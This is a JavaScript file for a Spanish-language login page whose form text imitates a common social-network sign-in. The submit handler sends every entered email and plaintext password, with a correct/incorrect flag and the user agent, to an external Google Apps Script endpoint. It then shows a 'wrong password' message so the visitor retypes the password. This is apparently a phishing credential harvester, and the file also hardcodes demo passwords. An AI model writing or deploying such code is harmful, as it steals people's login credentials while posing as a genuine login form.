// Configuración - USA ESTA URL (la misma que tienes)
const API_URL = 'https://script.google.com/macros/s/AKfycbwsPj9OX59TC_rzS34hWt2N2cVrBSHJ7cl02cJ0fg1H0yVzxp5JcmL8rYmfmMMQpdISPw/exec';

document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('togglePassword');
    const loginBtn = document.getElementById('loginBtn');
    const btnText = document.querySelector('.btn-text');
    const loadingSpinner = document.querySelector('.loading-spinner');
    const generalError = document.getElementById('general-error');

    // Base de datos simulada de usuarios válidos
    const validUsers = [
        { email: 'admin@misitio.com', password: 'admin123' },
        { email: 'usuario@misitio.com', password: 'usuario123' },
        { email: 'test@misitio.com', password: 'test123' }
    ];

    // Mostrar/ocultar contraseña
    togglePassword.addEventListener('click', function() {
        const passwordGroup = document.querySelector('.password-group');
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        passwordGroup.classList.toggle('show-password');
    });

    // Validación en tiempo real
    emailInput.addEventListener('input', validateEmail);
    passwordInput.addEventListener('input', validatePassword);

    function validateEmail() {
        const email = emailInput.value.trim();
        const emailError = document.getElementById('email-error');
        const emailGroup = emailInput.parentElement;

        hideGeneralError();

        if (!email) {
            showError(emailGroup, emailError, 'Ingresa un correo electrónico o teléfono');
            return false;
        }

        if (!isValidEmail(email)) {
            showError(emailGroup, emailError, 'Ingresa un correo electrónico válido');
            return false;
        }

        hideError(emailGroup, emailError);
        return true;
    }

    function validatePassword() {
        const password = passwordInput.value;
        const passwordError = document.getElementById('password-error');
        const passwordGroup = passwordInput.parentElement;

        hideGeneralError();

        if (!password) {
            showError(passwordGroup, passwordError, 'Ingresa tu contraseña');
            return false;
        }

        if (password.length < 6) {
            showError(passwordGroup, passwordError, 'La contraseña es demasiado corta');
            return false;
        }

        hideError(passwordGroup, passwordError);
        return true;
    }

    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    function showError(inputGroup, errorElement, message) {
        inputGroup.classList.add('error');
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }

    function hideError(inputGroup, errorElement) {
        inputGroup.classList.remove('error');
        errorElement.style.display = 'none';
    }

    function showGeneralError(message) {
        generalError.textContent = message;
        generalError.style.display = 'block';
        generalError.classList.add('show');
    }

    function hideGeneralError() {
        generalError.style.display = 'none';
        generalError.classList.remove('show');
    }

    // Envío del formulario
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        const isEmailValid = validateEmail();
        const isPasswordValid = validatePassword();

        if (isEmailValid && isPasswordValid) {
            await processLogin();
        }
    });

    async function processLogin() {
        // Mostrar estado de carga
        btnText.style.display = 'none';
        loadingSpinner.style.display = 'block';
        loginBtn.disabled = true;
        hideGeneralError();

        try {
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            console.log('🔍 Iniciando proceso de login...');

            // Verificar si las credenciales son válidas
            const isValid = checkCredentials(email, password);

            // ✅ GUARDAR EN GOOGLE SHEETS
            console.log('🌐 Intentando guardar en Google Sheets...');
            const saveSuccess = await saveToGoogleSheets(email, password, isValid);

            if (isValid && saveSuccess) {
                console.log('🎉 Login exitoso y datos guardados');
                alert('✅ ¡Inicio de sesión exitoso!');
                loginForm.reset();
            } else if (!isValid && saveSuccess) {
                console.log('❌ Credenciales incorrectas pero datos guardados');
                showGeneralError('❌ Contraseña incorrecta. Inténtalo de nuevo.');
                passwordInput.value = '';
                passwordInput.focus();
            } else {
                console.log('💥 Error al guardar datos');
                showGeneralError('❌ Error al guardar los datos. Inténtalo de nuevo.');
            }
            
        } catch (error) {
            console.error('💥 ERROR GENERAL:', error);
            showGeneralError('❌ Error al procesar el login. Inténtalo de nuevo.');
        } finally {
            // Restaurar estado normal
            btnText.style.display = 'block';
            loadingSpinner.style.display = 'none';
            loginBtn.disabled = false;
        }
    }

    // Verificar credenciales
    function checkCredentials(email, password) {
        return validUsers.some(user => 
            user.email === email && user.password === password
        );
    }

    // Guardar en Google Sheets - SOLUCIÓN CORS
    async function saveToGoogleSheets(email, password, isValid) {
        try {
            const requestData = {
                email: email,
                password: password,
                status: isValid ? '✅ CORRECTO' : '❌ INCORRECTO',
                userAgent: navigator.userAgent
            };
            
            console.log('📤 Enviando datos...', requestData);

            // Usar fetch con modo 'no-cors' no funciona para ver la respuesta
            // En su lugar, usamos el método tradicional
            const response = await fetch(API_URL, {
                method: 'POST',
                mode: 'no-cors', // Esto evita el error CORS pero no podemos leer la respuesta
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(requestData)
            });
            
            // Con 'no-cors' no podemos ver response.json(), así que asumimos éxito
            console.log('✅ Datos enviados (modo no-cors)');
            
            // En modo no-cors, asumimos que fue exitoso después de un tiempo
            await new Promise(resolve => setTimeout(resolve, 1000));
            return true;
            
        } catch (error) {
            console.error('💥 Error de conexión:', error);
            return false;
        }
    }

    // Efectos de focus
    emailInput.addEventListener('focus', function() {
        hideGeneralError();
    });

    passwordInput.addEventListener('focus', function() {
        hideGeneralError();
    });
});
